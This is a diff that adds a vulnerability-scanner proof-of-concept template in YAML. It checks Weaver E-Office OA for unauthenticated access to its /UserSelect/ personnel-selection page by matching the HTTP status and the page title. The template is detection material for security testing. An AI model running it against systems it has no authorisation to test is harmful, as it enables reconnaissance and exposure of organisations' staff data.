@@ -1,0 +1,16 @@
+id: poc-yaml-weaver-UserSelect-unauthorized-access
+info:
+  name: 泛微OA E-Office UserSelect 未授权访问漏洞
+  tags:
+  - 未授权访问
+  severity: medium
+  finger: e-office
+requests:
+- method: GET
+  rawPath: /UserSelect/
+  expression: status_code == 200 && contains(body,"<title>选择人员</title>")
+- method: GET
+  path: /UserSelect
+  expression: status_code == 301
+variables: {}
+transport: http
